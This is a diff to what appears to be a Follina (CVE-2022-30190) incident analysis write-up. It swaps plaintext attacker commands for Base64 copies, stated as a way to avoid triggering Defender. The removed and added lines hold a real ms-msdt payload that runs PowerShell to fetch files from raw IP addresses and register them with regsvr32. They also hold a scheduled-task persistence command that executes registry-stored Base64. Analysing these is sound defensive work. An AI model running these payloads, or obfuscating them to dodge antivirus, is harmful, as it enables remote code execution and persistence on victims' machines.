@@ -70,13 +70,10 @@ These can be extracted as usual. An important file for the analysis of a Follina
 --> this "relationship" file contained an external reference to a remote HTML file, configured to be retrieved and loaded when the Word doc is opened, or viewed in Preview mode
 
 At the bottom of the retrieved HTML page, a script tag with malicious JavaScript code that called the `ms-msdt` scheme was found:
+(Code is in Base64 as to not trigger Defender)
 
-
 ```
-ms-msdt:/id PCWDiagnostic /skip force /param "IT_RebrowseForFile=? IT_LaunchMethod=ContextMenu IT_BrowseForFile=$(Invoke-Expression($(Invoke-Expression('[System.Text.Encoding]'+[char]58+[char]58+'Unicode.GetString([System.Convert]'+[char]58+[char]58+'FromBase64String('+[char]34
-```
-```
-+'JABwACAAPQAgACQARQBuAHYAOgB0AGUAbQBwADsAaQB3AHIAIABoAHQAdABwADoALwAvADEAMAA0AC4AMwA2AC4AMgAyADkALgAxADMAOQAvACQAKAByAGEAbgBkAG8AbQApAC4AZABhAHQAIAAtAE8AdQB0AEYAaQBsAGUAIAAkAHAAXAB0AC4AQQA7AGkAdwByACAAaAB0AHQAcAA6AC8ALwA4ADUALgAyADMAOQAuADUANQAuADIAMgA4AC8AJAAoAHIAYQBuAGQAbwBtACkALgBkAGEAdAAgAC0ATwB1AHQARgBpAGwAZQAgACQAcABcAHQAMQAuAEEAOwBpAHcAcgAgAGgAdAB0AHAAOgAvAC8AMQA4ADUALgAyADMANAAuADIANAA3AC4AMQAxADkALwAkACgAcgBhAG4AZABvAG0AKQAuAGQAYQB0ACAALQBPAHUAdABGAGkAbABlACAAJABwAFwAdAAyAC4AQQA7AHIAZQBnAHMAdgByADMAMgAgACQAcABcAHQALgBBADsAcgBlAGcAcwB2AHIAMwAyACAAJABwAFwAdAAxAC4AQQA7AHIAZQBnAHMAdgByADMAMgAgACQAcABcAHQAMgAuAEEA'+[char]34+'))'))))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe"
+bXMtbXNkdDovaWQgUENXRGlhZ25vc3RpYyAvc2tpcCBmb3JjZSAvcGFyYW0gIklUX1JlYnJvd3NlRm9yRmlsZT0/IElUX0xhdW5jaE1ldGhvZD1Db250ZXh0TWVudSBJVF9Ccm93c2VGb3JGaWxlPSQoSW52b2tlLUV4cHJlc3Npb24oJChJbnZva2UtRXhwcmVzc2lvbignW1N5c3RlbS5UZXh0LkVuY29kaW5nXScrW2NoYXJdNTgrW2NoYXJdNTgrJ1VuaWNvZGUuR2V0U3RyaW5nKFtTeXN0ZW0uQ29udmVydF0nK1tjaGFyXTU4K1tjaGFyXTU4KydGcm9tQmFzZTY0U3RyaW5nKCcrW2NoYXJdMzQKKydKQUJ3QUNBQVBRQWdBQ1FBUlFCdUFIWUFPZ0IwQUdVQWJRQndBRHNBYVFCM0FISUFJQUJvQUhRQWRBQndBRG9BTHdBdkFERUFNQUEwQUM0QU13QTJBQzRBTWdBeUFEa0FMZ0F4QURNQU9RQXZBQ1FBS0FCeUFHRUFiZ0JrQUc4QWJRQXBBQzRBWkFCaEFIUUFJQUF0QUU4QWRRQjBBRVlBYVFCc0FHVUFJQUFrQUhBQVhBQjBBQzRBUVFBN0FHa0Fkd0J5QUNBQWFBQjBBSFFBY0FBNkFDOEFMd0E0QURVQUxnQXlBRE1BT1FBdUFEVUFOUUF1QURJQU1nQTRBQzhBSkFBb0FISUFZUUJ1QUdRQWJ3QnRBQ2tBTGdCa0FHRUFkQUFnQUMwQVR3QjFBSFFBUmdCcEFHd0FaUUFnQUNRQWNBQmNBSFFBTVFBdUFFRUFPd0JwQUhjQWNnQWdBR2dBZEFCMEFIQUFPZ0F2QUM4QU1RQTRBRFVBTGdBeUFETUFOQUF1QURJQU5BQTNBQzRBTVFBeEFEa0FMd0FrQUNnQWNnQmhBRzRBWkFCdkFHMEFLUUF1QUdRQVlRQjBBQ0FBTFFCUEFIVUFkQUJHQUdrQWJBQmxBQ0FBSkFCd0FGd0FkQUF5QUM0QVFRQTdBSElBWlFCbkFITUFkZ0J5QURNQU1nQWdBQ1FBY0FCY0FIUUFMZ0JCQURzQWNnQmxBR2NBY3dCMkFISUFNd0F5QUNBQUpBQndBRndBZEFBeEFDNEFRUUE3QUhJQVpRQm5BSE1BZGdCeUFETUFNZ0FnQUNRQWNBQmNBSFFBTWdBdUFFRUEnK1tjaGFyXTM0KycpKScpKSkpaS8uLi8uLi8uLi8uLi8uLi8uLi8uLi8uLi8uLi8uLi8uLi8uLi8uLi8uLi9XaW5kb3dzL1N5c3RlbTMyL21wc2lnc3R1Yi5leGUi
 ```
 
 When a system is vulnerable to Follina (CVE-2022-30190), the code will be interpreted and executed by `msdt.exe` (Microsoft Support Diagnostic Tool)
@@ -97,12 +94,9 @@ MSDT payload
 ### Persistence
 
 1. Scheduled tasks accross multiple endpoints
-
+(Code is in Base64 as to not trigger Defender)
 ```
-schtasks.exe /Create /F /TN "{E9ADEA37-C329-4967-9CF5-2682DA7D97BE}" /TR "cmd /c start /min \"\" powershell.exe 
-```
-```
--Command IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\SOFTWARE\Benfouqcgq).rxftejkhydnwmpt)))
+c2NodGFza3MuZXhlIC9DcmVhdGUgL0YgL1ROICJ7RTlBREVBMzctQzMyOS00OTY3LTlDRjUtMjY4MkRBN0Q5N0JFfSIgL1RSICJjbWQgL2Mgc3RhcnQgL21pbiBcIlwiIHBvd2Vyc2hlbGwuZXhlIC1Db21tYW5kIElFWChbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpBU0NJSS5HZXRTdHJpbmcoW1N5c3RlbS5Db252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZygoR2V0LUl0ZW1Qcm9wZXJ0eSAtUGF0aCBIS0NVOlxTT0ZUV0FSRVxCZW5mb3VxY2dxKS5yeGZ0ZWpraHlkbndtcHQpKSk=
 ```
 
 ***DETECTION*** creation of the scheduled tasks was logged in`Microsoft-Windows-TaskScheduler/Operational`
